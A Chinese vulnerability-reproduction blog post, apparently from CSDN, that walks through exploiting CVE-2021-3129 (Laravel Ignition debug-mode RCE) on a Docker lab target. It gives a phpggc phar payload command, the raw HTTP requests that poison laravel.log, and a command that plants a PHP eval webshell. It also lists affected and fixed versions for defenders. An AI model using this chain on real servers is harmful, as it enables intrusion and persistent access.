{"blogid": "123241080", "writerAge": "码龄2年", "writerBlogNum": "52", "writerCollect": "155", "writerComment": "38", "writerFan": "73", "writerGrade": "3级", "writerIntegral": "630", "writerName": "h领小白帽", "writerProfileAdress": "writer_image\\profile_123241080.jpg", "writerRankTotal": "26840", "writerRankWeekly": "16596", "writerThumb": "66", "writerVisitNum": "94915", "blog_read_count": "3733", "blog_time": "于 2022-03-03 09:06:02 发布", "blog_title": "【漏洞复现】CVE-2021-3129 Laravel Debug mode 远程代码执行漏洞", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-light\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#_6\">声明</a></li><li><a href=\"#_12\">前言</a></li><li><a href=\"#_18\">一、漏洞简介</a></li><li><a href=\"#_21\">二、影响范围</a></li><li><a href=\"#_27\">三、环境搭建</a></li><li><a href=\"#_32\">四、漏洞复现</a></li><li><a href=\"#_156\">五、修复方法</a></li><li><a href=\"#_162\">六、参考链接</a></li></ul>\n</div>\n<p></p>\n<hr color=\"#000000\" size='1\"'/>\n<h1><a id=\"_6\"></a>声明</h1>\n<p><font color=\"#222A\">仅供安全研究和技术学习，切勿用于非法用途，切记！</font></p>\n<hr color=\"#000000\" size='1\"'/>\n<h1><a id=\"_12\"></a>前言</h1>\n<p><font color=\"#222A\">Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)，旨在实现的Web软件的MVC架构，它可以让开发者从面条一样杂乱的代码中解脱出来，帮助构建一个完美的网络APP，而且每行代码都可以简洁、富于表达力。</font></p>\n<p><font color=\"#222A\">在Laravel中已经具有了一套高级的PHP ActiveRecord实现 – Eloquent ORM。它能方便的将“约束（constraints）”应用到关系的双方，这样开发者就具有了对数据的完全控制，而且享受到ActiveRecord的所有便利。Eloquent原生支持Fluent中查询构造器（query-builder）的所有方法。</font></p>\n<h1><a id=\"_18\"></a>一、漏洞简介</h1>\n<p><font color=\"#222A\">当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</font></p>\n<h1><a id=\"_21\"></a>二、影响范围</h1>\n<ul><li><font color=\"#222A\">Laravel &lt; 8.4.3</font></li><li><font color=\"#222A\">facade ignition &lt; 2.5.2</font></li></ul>\n<h1><a id=\"_27\"></a>三、环境搭建</h1>\n<ul><li><font color=\"#222A\">实验环境：KALI Linux</font></li><li><font color=\"#222A\">靶场地址：<br/> git clone https://github.com/SNCKER/CVE-2021-3129<br/> <img alt=\"在这里插入图片描述\" src=\"image\\4598e960306446a09e928191e08a8d11.png\"/></font></li></ul>\n<h1><a id=\"_32\"></a>四、漏洞复现</h1>\n<p><font color=\"#222A\">docker-compose build //重新进行编译<br/> <font color=\"#222A\">docker-conpose up -d //启动环境<br/> <img alt=\"在这里插入图片描述\" src=\"image\\271b42cd46a14818bb873163d1340e23.png\"/><br/> 本地浏览器访问<br/> <img alt=\"在这里插入图片描述\" src=\"image\\c29c2aad58e0434fab33b851595e6727.png\"/><br/> 点击<strong>Generate app key</strong>生成应用程序密钥<br/> 至此环境搭建完成</font></font></p>\n<p><strong>验证漏洞是否存在</strong><br/> burpsuite抓取一个数据包，按照下图的形式修改并发送数据包<br/> <img alt=\"在这里插入图片描述\" src=\"image\\45710bb7ed254bc59134358520a11cdc.png\"/><br/> 页面出现了Ignition的报错，说明漏洞存在，且开启了debug模式。</p>\n<p><strong>Laravel Debug mode RCE漏洞利用</strong></p>\n<p><font color=\"#222A\"><strong>方法一：</strong></font></p>\n<p><font color=\"#222A\">工具下载地址：git clone https://github.com/ambionics/phpggc.git</font></p>\n<p><font color=\"#222A\">(1)首先使用 phpggc工具生成一条laravel中存在的反序列化利用POC（经过编码后的）：</font></p>\n<pre><code>php -d \"phar.readonly=0\" ./phpggc Laravel/RCE5 \"phpinfo();\" --phar phar -o php://output | base64 -w 0 | python -c \"import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())\"\n</code></pre>\n<p>得到的POC（编码后的）最后面再加一个a，否则最终laravel.log里面将生成两个POC，导致利用失败：<br/> <img alt=\"在这里插入图片描述\" src=\"image\\dd8b1da0ee1046fb8a9ddb7a00e1c9be.png\"/><br/> <font color=\"#222A\">(2)发送如下数据包，将Laravel的原日志文件laravel.log清空：</font></p>\n<pre><code>POST /_ignition/execute-solution HTTP/1.1\nHost: X.X.X.X:8888\nContent-Type: application/json\nContent-Length: 328\n\n{\n  \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\n  \"parameters\": {\n    \"variableName\": \"username\",\n    \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"\n  }\n}\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\2c1d314d85ec4268a77ca797a2f58454.png\"/><br/> <font color=\"#222A\">(3)发送如下数据包，给Log增加一次前缀，用于对齐：</font></p>\n<pre><code>POST /_ignition/execute-solution HTTP/1.1\nHost: X.X.X.X:8888\nContent-Type: application/json\nContent-Length: 163\n\n{\n  \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\n  \"parameters\": {\n    \"variableName\": \"username\",\n    \"viewFile\": \"AA\"\n  }\n}\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\0aad27e577ce4e09b1d53176ac86a9b1.png\"/><br/> <font color=\"#222A\">(4)将之前生成的编码后的POC作为viewFile的值，发送数据包：</font></p>\n<pre><code>POST /_ignition/execute-solution HTTP/1.1\nHost: X.X.X.X:8888\nContent-Type: application/json\nContent-Length: 5058\n\n{\n  \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\n  \"parameters\": {\n    \"variableName\": \"username\",\n    \"viewFile\": \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=......2B=00=57=00=61=00=63=00=4E=00=67=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\"\n  }\n}\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\60ed370a54ea4eef9afad14ff5781ce1.png\"/><br/> <font color=\"#222A\">(5)发送如下数据包，清空对log文件中的干扰字符，只留下POC：</font></p>\n<pre><code>POST /_ignition/execute-solution HTTP/1.1\nHost: X.X.X.X:8888\nContent-Type: application/json\nContent-Length: 299\n\n{\n  \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\n  \"parameters\": {\n    \"variableName\": \"username\",\n    \"viewFile\": \"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"\n  }\n}\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\e6b271b02fca42f6a15a3e7e9d253ff1.png\"/><br/> <strong>tips:</strong> 这一步可能会出现异常，导致无法正确清理Log文件。如果出现这种状况，可以重新从第一步开始尝试</p>\n<p><font color=\"#222A\">(6) 使用phar://进行反序列化，执行任意代码（<strong>此时需要使用绝对路径</strong>）：</font></p>\n<pre><code>POST /_ignition/execute-solution HTTP/1.1\nHost: X.X.X.X:8888\nContent-Type: application/json\nContent-Length: 210\n\n{\n  \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\n  \"parameters\": {\n    \"variableName\": \"username\",\n    \"viewFile\": \"phar:///var/www/storage/logs/laravel.log/test.txt\"\n  }\n}\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\aa8e0086673d419aa419697db75059e4.png\"/><br/> <font color=\"#222A\">如下图所示，phpinfo()已成功执行，漏洞利用成功：<br/> <img alt=\"在这里插入图片描述\" src=\"image\\6a3dfd61a2ae4f1d8d855046d8ef3054.png\"/><br/> <font color=\"#222A\">我们可以利用该漏洞写入Webshell：</font></font></p>\n<pre><code>php -d \"phar.readonly=0\" ./phpggc Laravel/RCE5 \"system('echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php');\" --phar phar -o php://output | base64 -w 0 | python -c \"import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())\"\n</code></pre>\n<p><font color=\"#222A\">重复上述利用步骤后，即可连接Webshell ！</font></p>\n<p><font color=\"#222A\"><strong>方法二：</strong></font></p>\n<p><font color=\"#222A\">这里也可直接使用工具生成webshell进行连接(这里使用的是哥斯拉)</font></p>\n<p><font color=\"#222A\">github地址：https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP<br/> <img alt=\"在这里插入图片描述\" src=\"image\\4459b03ef53f41acab26d864a976a9ce.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\e7337d5f0c7c4dcdb57c5270f9db0454.png\"/><br/> 连接成功！！！</font></p>\n<hr color=\"#000000\" size='1\"'/>\n<h1><a id=\"_156\"></a>五、修复方法</h1>\n<p><strong>安全版本</strong></p>\n<ul><li>Laravel 8.4.3及其以上版本</li><li>facade ignition 2.5.2 及其以上版本</li></ul>\n<h1><a id=\"_162\"></a>六、参考链接</h1>\n<ul><li>https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</li></ul>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}